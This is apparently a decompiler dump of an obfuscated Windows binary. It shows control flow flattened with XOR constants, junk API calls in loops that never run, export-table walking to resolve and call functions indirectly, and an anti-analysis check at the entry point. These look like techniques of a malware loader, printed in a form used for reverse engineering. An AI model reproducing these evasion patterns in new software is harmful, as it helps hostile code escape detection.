  HICON v30; // [esp+A0h] [ebp-8h]
  int v31; // [esp+A4h] [ebp-4h]

  v27 = -4103;
  v25 = 183096;
  v26 = &v25;
  IconW = (HICON)sub_404FE4(a1);
  for ( dword_4079B9 = 0; (unsigned int)dword_4079B9 < 0x1B; ++dword_4079B9 )
  {
    if ( dword_4079B9 == 37 )
      IconW = LoadIconW((HINSTANCE)0x400000, &IconName);
  }
  v30 = IconW;
  v22 = 61724160;
  v31 = -4099;
  dword_4079A1 -= v20;
  do
  {
    if ( dword_407090 )
      break;
    v2 = off_4072D8[3];
    if ( *v2 )
    {
      dword_407A15 &= (unsigned int)&dword_4079CD;
      dword_407A15 -= (int)&dword_407995;
      dword_4074EC = sub_4069C6((char *)off_407584, *v2, (int)(off_4072D8 + 20), 1);
    }
    if ( dword_4074EC )
    {
      v29 = 0;
      for ( i = -4099; ; i = (v4 + 1) ^ 0x352F )
      {
        v11 = *v26;
        *(_BYTE *)*(&off_407B43 + 11) |= 0x2Eu;
        if ( v11 % 0x61 > 0x8A || i == -4147 )
          break;
        v4 = i ^ 0x352F;
        v30 = (HICON)(8 * (((i ^ 0x352Fu) + 9518) % ((v27 ^ 0x352Fu) + 9518)));
        v5 = stricmp(String1, String2);
        v19 = (__PAIR64__(v19, dword_407975) - __PAIR64__(dword_407991, v6)) >> 32;
        rcDst.bottom = 0;
        do
        {
          if ( ++rcDst.bottom == 35 )
            Sleep(0x6C19u);
        }
        while ( rcDst.bottom < 0x13u );
        if ( v5 )
        {
          v20 = 34;
          v18 += rcDst.left;
          Rect.left -= (LONG)&unk_40795D;
          Rect.left |= (unsigned int)&unk_40795D;
          sub_4069C6((char *)off_407584, dword_4074EC, (int)&unk_4074F0, 3);
        }
        v7 = -4595;
        for ( j = -9438; j != -9518; --j )
        {
          if ( v7 == -4568 )
          {
            *(_BYTE *)off_407BBF[0] = __ROL1__(*(_BYTE *)off_407BBF[0], 7);
            v8 = off_4072D8[3];
            v13 = *v8;
            if ( (unsigned int)v8 <= 0x79F2 )
              v18 += (int)v16 + ((unsigned int)v8 < 0x79F2);
            else
              v21 = ~(unsigned __int8)v21;
            *(_BYTE *)*(&off_407B43 + 52) += 121;
            dword_407514 = v29(v13, &unk_407638);
          }
          else if ( v7 == -4547 )
          {
            v23 += v22;
            v9 = (int (__stdcall *)(int, void *))sub_4069C6(
                                                   (char *)off_407584,
                                                   *(_DWORD *)off_40711C,
                                                   (int)&unk_4071A4,
                                                   2);
            v10 = __CFSHR__((unsigned __int16)v14, 9);
            v14 = (int)(unsigned __int16)v14 >> 9;
            dword_4079C5 = (unsigned __int8)dword_4079C5 - (v10 + sz.cx);
            v29 = v9;
          }
          v16 = &v17;
          v17 |= v15;
          v7 = (j - 1) ^ 0x352F;
        }
        j = 8 * (((v31 ^ 0x352Fu) + 9518) % ((v27 ^ 0x352Fu) + 9518));
        sub_40471A((int)v30, j);
        k = 140095736;
      }
    }
    for ( k = 16; k; --k )
    {
      if ( k == 26 )
        CharLowerW((LPWSTR)0x6DC6);
    }
    v31 = ((v31 ^ 0x352F) + 1) ^ 0x352F;
  }
  while ( v31 != -4595 );
  return 1;
}
// 405701: variable 'v6' is possibly undefined
// 405745: variable 'v5' is possibly undefined
// 405802: variable 'v16' is possibly undefined
// 405871: variable 'v14' is possibly undefined
// 4058A2: variable 'v15' is possibly undefined
// 407090: using guessed type int dword_407090;
// 40711C: using guessed type void *off_40711C;
// 4072D8: using guessed type int **off_4072D8;
// 4074EC: using guessed type int dword_4074EC;
// 407514: using guessed type int dword_407514;
// 407584: using guessed type int (__stdcall *off_407584)(int, int, int);
// 407965: using guessed type int dword_407965;
// 407969: using guessed type int dword_407969;
// 407975: using guessed type int dword_407975;
// 407991: using guessed type int dword_407991;
// 407995: using guessed type int dword_407995;
// 4079A1: using guessed type int dword_4079A1;
// 4079B9: using guessed type int dword_4079B9;
// 4079C5: using guessed type int dword_4079C5;
// 4079CD: using guessed type int dword_4079CD;
// 4079D1: using guessed type int dword_4079D1;
// 4079F1: using guessed type int dword_4079F1;
// 407A15: using guessed type int dword_407A15;
// 407A3D: using guessed type int dword_407A3D;
// 407B43: using guessed type int *off_407B43;
// 407BBF: using guessed type int *off_407BBF[11];

//----- (0040599D) --------------------------------------------------------
int __userpurge sub_40599D@<eax>(__int16 a1@<ax>, unsigned __int16 a2)
{
  bool v2; // zf
  int v3; // eax
  const WCHAR *lpFormat; // [esp+0h] [ebp-1Ch]
  unsigned int v6; // [esp+10h] [ebp-Ch]

  v2 = a1 == (__int16)a2;
  v3 = -4099;
  if ( v2 )
  {
    v6 = 0;
    do
    {
      if ( ++v6 == 36 )
        GetDateFormatW(0x4FA8u, 0x30C8u, (const SYSTEMTIME *)0x88F3, lpFormat, &DateStr, 25742);
    }
    while ( v6 < 0x1A );
    v3 = -4100;
  }
  return (v3 ^ 0x352F) + 9518;
}
// 4059CA: variable 'v6' is possibly undefined
// 4059F8: variable 'lpFormat' is possibly undefined

//----- (00405A1D) --------------------------------------------------------
int __userpurge sub_405A1D@<eax>(char a1@<al>, unsigned __int8 a2)
{
  bool v2; // zf
  int v3; // eax
  WPARAM wParam; // [esp+0h] [ebp-14h]
  LPARAM lParam; // [esp+4h] [ebp-10h]

  v2 = a1 == (char)a2;
  v3 = -4099;
  if ( v2 )
  {
    for ( dword_407969 = 0; (unsigned int)dword_407969 < 0x1F; ++dword_407969 )
    {
      if ( dword_407969 == 40 )
        PostMessageA((HWND)0x1CB5, 0x4891u, wParam, lParam);
    }
    v3 = -4100;
  }
  return (v3 ^ 0x352F) + 9518;
}
// 405A80: variable 'wParam' is possibly undefined
// 405A80: variable 'lParam' is possibly undefined
// 407969: using guessed type int dword_407969;

//----- (00405A9C) --------------------------------------------------------
int __userpurge sub_405A9C@<eax>(
        int a1@<edi>,
        int *a2@<esi>,
        _DWORD *a3,
        unsigned int *a4,
        _DWORD *a5,
        _DWORD *a6,
        _DWORD *a7,
        _DWORD *a8,
        _DWORD *a9,
        unsigned int *a10)
{
  unsigned int i; // ebx
  unsigned int v11; // edx
  int v12; // eax
  unsigned int v13; // ecx
  unsigned int v14; // eax
  unsigned int *v15; // ecx
  int v16; // eax
  int v17; // eax
  int result; // eax
  int v19; // [esp+0h] [ebp-B4h]
  int v20; // [esp+4h] [ebp-B0h]
  int v21; // [esp+60h] [ebp-54h]
  unsigned __int8 v22; // [esp+64h] [ebp-50h]
  int v23; // [esp+68h] [ebp-4Ch]
  int v24; // [esp+80h] [ebp-34h]
  HWND hWndParent; // [esp+8Ch] [ebp-28h]
  BOOL bPrevious; // [esp+9Ch] [ebp-18h]
  LPARAM dwInitParam; // [esp+A0h] [ebp-14h]
  INT_PTR (__stdcall *lpDialogFunc)(HWND, UINT, WPARAM, LPARAM); // [esp+A4h] [ebp-10h]

  for ( i = -4099; i != -4147; i = ((i ^ 0x352F) + 1) ^ 0x352F )
  {
    v11 = 0;
    for ( dword_4079F9 = 0; (unsigned int)dword_4079F9 < 0x19; ++dword_4079F9 )
    {
      if ( dword_4079F9 == 40 )
        GetNextDlgGroupItem((HWND)0x13BA, (HWND)0x110D, bPrevious);
    }
    if ( __PAIR64__(v11, i) % 0x43 == 118 || i == -4104 )
    {
      v17 = *(_DWORD *)(*a2 + 32);
      *a3 = a1 + *(_DWORD *)(*a2 + 28);
      v20 &= v19;
      v15 = a4;
      v14 = a1 + v17;
LABEL_25:
      *v15 = v14;
      goto LABEL_26;
    }
    v24 -= dword_4079F1;
    dword_407A09 -= *off_407B57;
    if ( i % 0x76 >= 0x98 || i == -4102 )
    {
      dword_407A1D = 0;
      do
      {
        if ( ++dword_407A1D == 37 )
          CreateDialogParamA((HINSTANCE)0x400000, TemplateName, hWndParent, lpDialogFunc, dwInitParam);
      }
      while ( (unsigned int)dword_407A1D < 0x1C );
      dword_407975 ^= 0x3578u;
      v16 = a1 + *(_DWORD *)(a1 + 60);
      *a5 = v16;
      *a2 = a1 + *(_DWORD *)(v16 + 120);
    }
    else
    {
      v21 -= 16273;
      if ( i % 0x65 > 0x896 || i == -4108 )
      {
        *a6 = -4103;
        *a7 = -4103;
        *a8 = -4101;
        goto LABEL_26;
      }
      if ( i % 0x87 == 259 || i == -4106 )
      {
        v12 = *a2;
        v23 += v22;
        *a9 = a1 + *(_DWORD *)(*a2 + 36);
        v13 = *(_DWORD *)(v12 + 20);
        v14 = *(_DWORD *)(v12 + 24);
        if ( v13 > v14 )
          v14 = v13;
        v15 = a10;
        goto LABEL_25;
      }
    }
LABEL_26:
    result = 13615;
  }
  return result;
}
// 405B00: variable 'bPrevious' is possibly undefined
// 405B1D: variable 'v11' is possibly undefined
// 405B42: variable 'v24' is possibly undefined
// 405B84: variable 'v21' is possibly undefined
// 405C02: variable 'v22' is possibly undefined
// 405C0D: variable 'v23' is possibly undefined
// 405C91: variable 'hWndParent' is possibly undefined
// 405C91: variable 'lpDialogFunc' is possibly undefined
// 405C91: variable 'dwInitParam' is possibly undefined
// 405CE1: variable 'v19' is possibly undefined
// 405CE1: variable 'v20' is possibly undefined
// 407975: using guessed type int dword_407975;
// 4079F1: using guessed type int dword_4079F1;
// 4079F9: using guessed type int dword_4079F9;
// 407A09: using guessed type int dword_407A09;
// 407A1D: using guessed type int dword_407A1D;
// 407B57: using guessed type int *off_407B57;
// 407BE7: using guessed type int *off_407BE7;

//----- (00405D48) --------------------------------------------------------
int __userpurge start@<eax>(unsigned int a1@<ebx>, int a2)
{
  WCHAR v3; // ax
  WCHAR v4; // cx
  WCHAR v5; // dx
  unsigned int v6; // edi
  DWORD CurrentProcessId; // eax
  int v8; // [esp+E8h] [ebp-31Ch]
  unsigned int v9; // [esp+1D8h] [ebp-22Ch]
  int i; // [esp+1E8h] [ebp-21Ch]
  WCHAR pszPath[260]; // [esp+1ECh] [ebp-218h] BYREF
  unsigned int v12; // [esp+3F4h] [ebp-10h] BYREF
  UINT Msg; // [esp+3F8h] [ebp-Ch] BYREF
  unsigned int v14; // [esp+3FCh] [ebp-8h] BYREF
  void **v15; // [esp+400h] [ebp-4h] BYREF
  int savedregs; // [esp+404h] [ebp+0h] BYREF
  void *retaddr; // [esp+408h] [ebp+4h] BYREF

  if ( StrSpnA(psz, pszSet) > 10 )
    return 0;
  for ( i = 19; i; --i )
  {
    if ( i == 20 )
      DefWindowProcA(*(HWND *)&pszPath[256], Msg, 0x3D02u, 15354);
  }
  sub_4041AB((int)&savedregs, 0xFFFFEFFD, &v12);
  pszPath[0] = 70;
  pszPath[1] = 58;
  pszPath[2] = 92;
  pszPath[3] = 92;
  v3 = 74;
  pszPath[4] = 74;
  v4 = 72;
  pszPath[5] = 72;
  pszPath[6] = 68;
  v5 = 75;
  pszPath[7] = 75;
  pszPath[8] = 74;
  *(_BYTE *)*(&off_407B43 + 42) += 11;
  pszPath[9] = 72;
  pszPath[10] = 74;
  pszPath[11] = 75;
  pszPath[14] = 92;
  pszPath[12] = 72;
  pszPath[15] = 68;
  pszPath[16] = 74;
  dword_4079A1 = 0;
  do
  {
    if ( ++dword_4079A1 == 25 )
      v3 = ClientToScreen(*(HWND *)&pszPath[256], *(LPPOINT *)&pszPath[256]);
  }
  while ( (unsigned int)dword_4079A1 < 0x18 );
  pszPath[21] = v3;
  pszPath[17] = v5;
  Rect.top += (LONG)&dword_4079C1;
  pszPath[23] = 46;
  pszPath[24] = 68;
  pszPath[25] = 76;
  dword_4079C5 = (int)&BytesRead + (unsigned int)&dword_407A15 + (_DWORD)&rcDst.top;
  pszPath[26] = 76;
  memset(&pszPath[27], 0, 466);
  pszPath[18] = v3;
  pszPath[13] = 92;
  pszPath[19] = v4;
  pszPath[20] = v5;
  pszPath[22] = v4;
  if ( PathMakePrettyW(pszPath) )
  {
    sub_404262((int)&savedregs, (unsigned int)&Msg, (LONG *)&v14);
    dword_407945 = __ROL4__((unsigned __int8)dword_407945, 1);
    sub_404262((int)&savedregs, 0, &dword_407548);
    sub_4041AB((int)&savedregs, 0, (unsigned int *)&dword_40754C);
    sub_404262((int)&savedregs, 0, &dword_407550);
    sub_404262((int)&savedregs, 0, &dword_407554);
  }
  dword_4079F9 |= v8;
  v15 = &retaddr;
  sub_404262((int)&savedregs, 0x6586476u, (LONG *)&v15);
  v15 = (void **)&savedregs;
  sub_403ACA(&savedregs);
  sub_404262((int)&savedregs, dword_407548, &dword_4074CC);
  sub_4041AB((int)&savedregs, dword_40754C, (unsigned int *)&dword_4074D0);
  v6 = dword_407550;
  for ( sz.cx = 0; sz.cx < 0x18u; ++sz.cx )
  {
    if ( sz.cx == 35 )
      IntersectRect((LPRECT)&Rect.bottom, (const RECT *)0x8CCD, *(const RECT **)&pszPath[256]);
  }
  sub_404262((int)&savedregs, v6, (LONG *)&unk_4074D4);
  sub_404262((int)&savedregs, v14, &dword_4074D8);
  CurrentProcessId = GetCurrentProcessId();
  rcDst.left = dword_40797D + ((unsigned int)&dword_4074D8 < v9) + LOBYTE(rcDst.left);
  if ( CurrentProcessId )
  {
    sub_405183(a1);
  }
  else if ( GetCurrentThreadId() )
  {
    ExitProcess(0);
  }
  *(_DWORD *)v14 = *(_DWORD *)dword_4074D8;
  rcDst.top = (unsigned int)&dword_4079E1 ^ ((unsigned int)&Rect + (_DWORD)&dword_407979);
  dword_407100 ^= dword_407104;
  *(_DWORD *)dword_407554 += dword_407100;
  return *(_DWORD *)v14;
}
// 405FA4: variable 'v5' is possibly undefined
// 40603A: variable 'v4' is possibly undefined
// 4060D2: variable 'v8' is possibly undefined
// 4061C3: variable 'v9' is possibly undefined
// 407100: using guessed type int dword_407100;
// 407104: using guessed type int dword_407104;
// 4074CC: using guessed type int dword_4074CC;
// 4074D0: using guessed type int dword_4074D0;
// 4074D8: using guessed type int dword_4074D8;
// 407548: using guessed type int dword_407548;
// 40754C: using guessed type int dword_40754C;
// 407550: using guessed type int dword_407550;
// 407554: using guessed type int dword_407554;
// 407945: using guessed type int dword_407945;
// 407979: using guessed type int dword_407979;
// 40797D: using guessed type int dword_40797D;
// 4079A1: using guessed type int dword_4079A1;
// 4079C1: using guessed type int dword_4079C1;
// 4079C5: using guessed type int dword_4079C5;
// 4079D1: using guessed type int dword_4079D1;
// 4079DD: using guessed type int dword_4079DD;
// 4079E1: using guessed type int dword_4079E1;
// 4079F9: using guessed type int dword_4079F9;
// 407A15: using guessed type int dword_407A15;
// 407B43: using guessed type int *off_407B43;
// 407B5B: using guessed type void *off_407B5B;
// 407B5F: using guessed type int *off_407B5F[3];
// 407B73: using guessed type int *off_407B73[3];
// 407BB7: using guessed type int *off_407BB7[13];
// 407BD3: using guessed type int *off_407BD3[6];

//----- (004062AE) --------------------------------------------------------
void __fastcall b_cw_wkqwprts_T_T__(unsigned int a1, int a2, int *a3, char *a4)
{
  dword_4079B9 = dword_4079E9 + (a1 < dword_407A2D) + (unsigned __int8)dword_4079B9;
  dword_4079FD = (unsigned __int8)dword_4079FD - *(_DWORD *)off_407B6B;
  *off_407C13[0] |= rcDst.left;
}
// 4079B9: using guessed type int dword_4079B9;
// 4079E9: using guessed type int dword_4079E9;
// 4079FD: using guessed type int dword_4079FD;
// 407A2D: using guessed type int dword_407A2D;
// 407B6B: using guessed type void *off_407B6B;
// 407C13: using guessed type int *off_407C13[7];

//----- (004062FC) --------------------------------------------------------
int __userpurge sub_4062FC@<eax>(unsigned int a1@<edi>, int a2, int a3, int *a4)
{
  int v4; // ecx
  unsigned int v6; // edx
  __int16 v7; // ax
  __int16 v8; // ax
  __int16 v9; // di
  unsigned int v10; // eax
  unsigned int v11; // eax
  int v12; // eax
  int result; // eax
  unsigned __int16 v14; // [esp-10h] [ebp-110h]
  char v15; // [esp+2Ch] [ebp-D4h]
  int v16; // [esp+50h] [ebp-B0h]
  int v17; // [esp+58h] [ebp-A8h]
  int v18; // [esp+7Ch] [ebp-84h]
  unsigned int v19; // [esp+8Ch] [ebp-74h]
  int v20; // [esp+A0h] [ebp-60h]
  int v21; // [esp+A0h] [ebp-60h]
  int v22; // [esp+BCh] [ebp-44h]
  unsigned int v23; // [esp+BCh] [ebp-44h]
  int v24; // [esp+C4h] [ebp-3Ch]
  HWND uValue; // [esp+D8h] [ebp-28h]
  unsigned int hbmImage; // [esp+DCh] [ebp-24h]
  int nWidth; // [esp+E4h] [ebp-1Ch]
  int Y; // [esp+E8h] [ebp-18h]
  int v29; // [esp+ECh] [ebp-14h]
  int v30; // [esp+F8h] [ebp-8h]
  int v31; // [esp+FCh] [ebp-4h]
  int v32; // [esp+FCh] [ebp-4h]
  int v33; // [esp+FCh] [ebp-4h]
  int v34; // [esp+FCh] [ebp-4h]
  int v35; // [esp+FCh] [ebp-4h]
  int savedregs; // [esp+100h] [ebp+0h] BYREF
  int v37; // [esp+108h] [ebp+8h]

  v21 = v20 - 19124;
  v31 = 108356888;
  for ( uValue = 0; (unsigned int)uValue < 0x1A; uValue = (HWND)((char *)uValue + 1) )
    ;
  hbmImage = -4099;
  *off_407BFF[0] &= (unsigned __int16)dword_407969;
  v4 = 13615;
  *(_BYTE *)*(&off_407B43 + 29) += (a1 > 0xFFFFEFFC) + 109;
  v29 = -1;
  v6 = 9518;
  v23 = v22 | 1;
  v30 = 1;
  while ( 2 )
  {
    *off_407C37[0] += 13271;
    Y = -11356;
    v32 = 3287866 * (v31 | 0x651516) + 2385255;
    v21 |= (unsigned __int8)dword_4079E1;
    v29 += (v4 ^ 0xFFFFEFFC) + 9518;
    v7 = *(_WORD *)(a2 + 32) ^ 0x32F;
    dword_407A15 -= *off_407B7B;
    if ( v6 + (v4 ^ 0xFFFFEFFC) > (unsigned __int16)(v7 + 558) )
      goto LABEL_23;
    nWidth = -9518;
    while ( 1 )
    {
      *(_BYTE *)*(&off_407B43 + 32) += (v6 < dword_407A3D) + 62;
      v37 = nWidth + 9518;
      v8 = *(_WORD *)(a2 + 4 * (nWidth + 9518) + 2) ^ 0x32F;
      dword_407A29 = 0;
      do
      {
        if ( ++dword_407A29 == 31 )
          v8 = DestroyPropertySheetPage((HPROPSHEETPAGE)0x7830);
      }
      while ( (unsigned int)dword_407A29 < 0x14 );
      if ( (unsigned __int16)(v8 + 558) != v29 )
        goto LABEL_16;
      v30 *= v6 + (v4 ^ 0xFFFFEFFC);
      if ( sub_40599D(*(_WORD *)(a2 + 4 * v37), 0xFEFDu) )
      {
        dword_407A29 |= (unsigned __int16)dword_4079B5;
        dword_407A19 -= (int)&unk_40795D;
        dword_407A19 ^= (unsigned int)&dword_407961;
        if ( sub_405A1D(*(_BYTE *)(v29 * (v6 + (v4 ^ 0xFFFFEFFC)) + a3), 0) )
          break;
      }
      dword_4079B9 = v18 ^ (unsigned __int16)dword_4079B9;
      v19 = (__PAIR64__(v19, 815) - 0x75E200005A1Fi64) >> 32;
      *(_BYTE *)*(&off_407B43 + 52) += 51;
      v14 = (*(unsigned __int8 *)(v29 * (v6 + (v4 ^ 0xFFFFEFFC)) + a3) - 558) ^ 0x32F;
      rcDst.top += (LONG)&dword_40797D;
      if ( sub_40599D(*(_WORD *)(a2 + 4 * v37), v14) )
        break;
      Y = -5228;
LABEL_16:
      *(_BYTE *)*(&off_407B43 + 15) &= 0x47u;
      v9 = *(_WORD *)(a2 + 32) ^ 0x32F;
      nWidth += (v4 ^ 0xFFFFEFFC) + 9518;
      v10 = (v4 ^ 0xFFFFEFFC) + nWidth + 19036;
      rcDst.left = 0;
      do
      {
        if ( ++rcDst.left == 29 )
          v10 = MoveWindow(uValue, 23852, Y, nWidth, 23619, Y);
      }
      while ( rcDst.left < 0x1Bu );
      if ( v10 > (unsigned __int16)(v9 + 558) )
        goto LABEL_23;
    }
    Y = -10356;
    *(_DWORD *)&DateStr += &dword_4079C1;
    hbmImage = v4 ^ ((v4 ^ hbmImage) + (v4 ^ 0xFFFFEFFC) + 9518);
LABEL_23:
    dword_407991 += *off_407BD7[0];
    v33 = v32 ^ 0x47516;
    v11 = *(unsigned __int8 *)(v29 * (v6 + (v4 ^ 0xFFFFEFFC)) + a3);
    v17 += v16 + (v11 < dword_407A2D);
    if ( (v4 ^ (v11 - v6)) == -4099 )
    {
      for ( dword_407961 = 30; dword_407961; --dword_407961 )
      {
        if ( dword_407961 == 40 )
          ImageList_AddMasked((HIMAGELIST)0x8F1E, (HBITMAP)hbmImage, hbmImage);
      }
      v30 += (v4 ^ 0xFFFFEFFD) + 9518;
    }
    else
    {
      v34 = v33 + 332809;
      if ( Y == -5228 )
      {
        v24 += v23 + (v23 < 0xFFFFDAD2);
        v30 += -9518 - (v4 ^ 0xFFFFEFFC);
        v35 = v34 - 145466;
      }
      else
      {
        v15 &= 0x67u;
        v30 += -9518 - (v4 ^ 0xFFFFEFFD);
        dword_4079F9 ^= dword_407A0D;
        v35 = 480870 * (v34 & 0x2CA09);
      }
      if ( v30 != v6 + (v4 ^ 0xFFFFEFFD) )
      {
        v31 = v35 + 2308648;
        continue;
      }
    }
    break;
  }
  if ( ((unsigned __int16)((v4 ^ hbmImage) + 8960) ^ 0x32F) == *(_WORD *)(a2 + 32)
    || (v12 = -4100, v30 == v6 + (v4 ^ 0xFFFFEFFD)) )
  {
    v12 = -4099;
  }
  dword_4079F5 = (__PAIR64__((struct tagRECT *)&Rect.top, v4) - __PAIR64__(&dword_4079B5, &savedregs)) >> 32;
  dword_4079F5 &= (unsigned int)&dword_4079A1;
  result = v30 + -9518 - (v4 ^ v12);
  *a4 = result;
  return result;
}
// 4062FC: could not find valid save-restore pair for ebx
// 40635C: conditional instruction was optimized away because %uValue.4<1Au
// 40631E: variable 'v20' is possibly undefined
// 406425: variable 'v22' is possibly undefined
// 406470: variable 'v4' is possibly undefined
// 4064A0: variable 'v6' is possibly undefined
// 4065E2: variable 'v18' is possibly undefined
// 406605: variable 'v19' is possibly undefined
// 40677D: variable 'v16' is possibly undefined
// 40677D: variable 'v17' is possibly undefined
// 4067C1: variable 'v15' is possibly undefined
// 4067FD: variable 'v24' is possibly undefined
// 407959: using guessed type int dword_407959;
// 407961: using guessed type int dword_407961;
// 407969: using guessed type int dword_407969;
// 40797D: using guessed type int dword_40797D;
// 407991: using guessed type int dword_407991;
// 4079A1: using guessed type int dword_4079A1;
// 4079B5: using guessed type int dword_4079B5;
// 4079B9: using guessed type int dword_4079B9;
// 4079C1: using guessed type int dword_4079C1;
// 4079E1: using guessed type int dword_4079E1;
// 4079E5: using guessed type int dword_4079E5;
// 4079E9: using guessed type int dword_4079E9;
// 4079F5: using guessed type int dword_4079F5;
// 4079F9: using guessed type int dword_4079F9;
// 407A0D: using guessed type int dword_407A0D;
// 407A15: using guessed type int dword_407A15;
// 407A19: using guessed type int dword_407A19;
// 407A29: using guessed type int dword_407A29;
// 407A2D: using guessed type int dword_407A2D;
// 407A3D: using guessed type int dword_407A3D;
// 407B43: using guessed type int *off_407B43;
// 407B7B: using guessed type int *off_407B7B;
// 407BD7: using guessed type int *off_407BD7[5];
// 407BFF: using guessed type int *off_407BFF[12];
// 407C37: using guessed type int *off_407C37[2];

//----- (004069C6) --------------------------------------------------------
int __cdecl sub_4069C6(char *a1, int a2, int a3, int a4)
{
  unsigned int v4; // ecx
  int ImageCount; // eax
  int v7; // ecx
  int v8; // esi
  _BYTE *v9; // eax
  int v10; // ecx
  int v11; // edx
  int *v12; // eax
  int v14; // [esp-8h] [ebp-208h]
  int *v15; // [esp-4h] [ebp-204h]
  _BYTE v16[116]; // [esp+0h] [ebp-200h] BYREF
  int v17; // [esp+74h] [ebp-18Ch]
  unsigned int v18; // [esp+CCh] [ebp-134h]
  int j; // [esp+130h] [ebp-D0h]
  unsigned int v20; // [esp+13Ch] [ebp-C4h]
  int *v21; // [esp+144h] [ebp-BCh]
  int v22; // [esp+148h] [ebp-B8h] BYREF
  int v23; // [esp+14Ch] [ebp-B4h]
  unsigned int v24; // [esp+150h] [ebp-B0h]
  int v25; // [esp+158h] [ebp-A8h]
  int v26; // [esp+15Ch] [ebp-A4h]
  unsigned int v27; // [esp+174h] [ebp-8Ch]
  int v28; // [esp+18Ch] [ebp-74h]
  int i; // [esp+19Ch] [ebp-64h]
  int *v30; // [esp+1A0h] [ebp-60h]
  int *v31; // [esp+1A4h] [ebp-5Ch]
  int *v32; // [esp+1A8h] [ebp-58h]
  int *v33; // [esp+1ACh] [ebp-54h]
  int v34; // [esp+1B0h] [ebp-50h] BYREF
  int v35; // [esp+1B4h] [ebp-4Ch] BYREF
  int v36; // [esp+1B8h] [ebp-48h] BYREF
  int v37; // [esp+1BCh] [ebp-44h] BYREF
  int v38; // [esp+1C0h] [ebp-40h] BYREF
  int v39; // [esp+1C4h] [ebp-3Ch] BYREF
  int (__thiscall *v40)(int); // [esp+1C8h] [ebp-38h]
  unsigned int v41; // [esp+1CCh] [ebp-34h] BYREF
  int v42; // [esp+1D0h] [ebp-30h] BYREF
  unsigned int v43; // [esp+1D4h] [ebp-2Ch] BYREF
  int v44; // [esp+1D8h] [ebp-28h] BYREF
  int v45; // [esp+1DCh] [ebp-24h] BYREF
  int v46; // [esp+1E0h] [ebp-20h] BYREF
  int v47; // [esp+1E4h] [ebp-1Ch] BYREF
  HANDLE hFile; // [esp+1E8h] [ebp-18h]
  int v49; // [esp+1ECh] [ebp-14h]
  _BYTE *v50; // [esp+1F0h] [ebp-10h]
  HIMAGELIST himl; // [esp+1F4h] [ebp-Ch]
  _BYTE *v52; // [esp+1F8h] [ebp-8h]
  int v53; // [esp+1FCh] [ebp-4h] BYREF
  int savedregs; // [esp+200h] [ebp+0h] BYREF
  char *v55; // [esp+208h] [ebp+8h]

  v34 = 11015;
  v35 = 30006;
  v36 = 549991;
  v37 = 18023;
  v30 = &v34;
  v31 = &v35;
  v32 = &v36;
  v33 = &v37;
  v49 = -4100;
  hFile = (HANDLE)-4099;
  for ( himl = (HIMAGELIST)-4099; ; himl = (HIMAGELIST)((((unsigned int)himl ^ 0x352F) + 1) ^ 0x352F) )
  {
    if ( hFile == (HANDLE)-4099 )
    {
      for ( i = 28; i; --i )
      {
        if ( i == 42 )
          CreateHalftonePalette((HDC)0x7587);
      }
      dword_407A39 ^= (unsigned int)&Rect.top;
      dword_407A39 -= (int)&rcDst.top;
      dword_407A39 |= (unsigned int)&unk_40796D;
      sub_405A9C(a2, &v47, &v39, &v41, &v38, &v44, &v45, &v42, &v46, &v43);
    }
    if ( v45 != -4099 && (!*(_DWORD *)(v47 + 24) || !*(_DWORD *)(v47 + 20)) )
    {
      v49 = -4099;
      goto LABEL_28;
    }
    if ( v44 == -4099 )
      return 0;
    v26 = 331804950;
    if ( himl == (HIMAGELIST)((v43 - 9518) ^ 0x352F) || v49 != -4100 )
      return 0;
    v4 = ((unsigned int)himl ^ 0x352F) + 9518;
    if ( v4 >= 5 )
      hFile = (HANDLE)-4100;
    v55 = a1 + 30010;
    if ( v4 >= *(_DWORD *)(v47 + 24) || *(unsigned __int16 *)(v46 + 2 * v4) > (unsigned int)(*(_DWORD *)(v47 + 20) - 1) )
      return 0;
    a1 = v55 - 30010;
    v53 = 0;
    dword_407965 &= Rect.top;
    ImageCount = 9518;
    v40 = (int (__thiscall *)(int))*(unsigned __int16 *)(v4 * ((v42 ^ 0x352F) + 9518) + v46);
    v15 = &v53;
    v20 = 0;
    do
    {
      if ( ++v20 == 43 )
        ImageCount = ImageList_GetImageCount(himl);
    }
    while ( v20 < 0x1D );
    if ( v27 <= 0x250F )
      dword_407971 -= *(_DWORD *)off_407C3F;
    else
      *(_BYTE *)*(&off_407B43 + 34) -= 99;
    _EDX = off_407C0B[0];
    __asm { rcr     byte ptr [edx], 5 }
    v25 ^= (unsigned __int16)v24;
    v14 = a2 + *(_DWORD *)(v4 * (ImageCount + (v45 ^ 0x352F)) + v41);
    dword_4079E1 -= 13986;
    dword_407A39 -= (int)&dword_4079E9;
    dword_407A39 &= (unsigned int)&dword_4079C9;
    ((void (__stdcall *)(int, int, int *))a1)(a3, v14, v15);
    if ( v53 == 1 )
      break;
LABEL_28:
    v23 ^= 0x5A15u;
  }
  v28 = 318156674;
  v21 = &v22;
  v22 -= 11432;
  v7 = v39;
  v40 = (int (__thiscall *)(int))(a2 + *(_DWORD *)(v39 + 4 * (_DWORD)v40));
  v52 = 0;
  if ( a4 )
  {
    dword_407979 += *off_407B7B;
    v50 = 0;
    v8 = (v44 ^ 0x352F) + 9518;
    v38 = a4 * v8;
    v27 = (__PAIR64__(v27, v8) - __PAIR64__(dword_407959, &savedregs)) >> 32;
    v52 = v16;
    v9 = v16;
    v24 = (__PAIR64__(v24, v16) - __PAIR64__((unsigned int)v21, v18)) >> 32;
    v10 = a4 * v8;
    do
    {
      --v9;
      --v10;
    }
    while ( v10 );
    v50 = v9;
    v17 = *off_407BBB[0] + (unsigned __int16)v17;
    v11 = a4;
    for ( j = 28; j; --j )
    {
      if ( j == 29 )
        SetCommMask(hFile, 0x6EAEu);
    }
    v7 = 0;
    v12 = &a4;
    do
    {
      *(_DWORD *)&v50[v7] = *++v12;
      v7 += v8;
      --v11;
    }
    while ( v11 );
  }
  else
  {
    v52 = 0;
  }
  return v40(v7);
}
// 406C6B: variable 'v4' is possibly undefined
// 406E14: variable 'v11' is possibly undefined
// 407959: using guessed type int dword_407959;
// 407965: using guessed type int dword_407965;
// 407971: using guessed type int dword_407971;
// 407979: using guessed type int dword_407979;
// 4079C9: using guessed type int dword_4079C9;
// 4079D1: using guessed type int dword_4079D1;
// 4079E1: using guessed type int dword_4079E1;
// 4079E9: using guessed type int dword_4079E9;
// 407A0D: using guessed type int dword_407A0D;
// 407A19: using guessed type int dword_407A19;
// 407A39: using guessed type int dword_407A39;
// 407B43: using guessed type int *off_407B43;
// 407B7B: using guessed type int *off_407B7B;
// 407BBB: using guessed type int *off_407BBB[12];
// 407C0B: using guessed type int *off_407C0B[9];
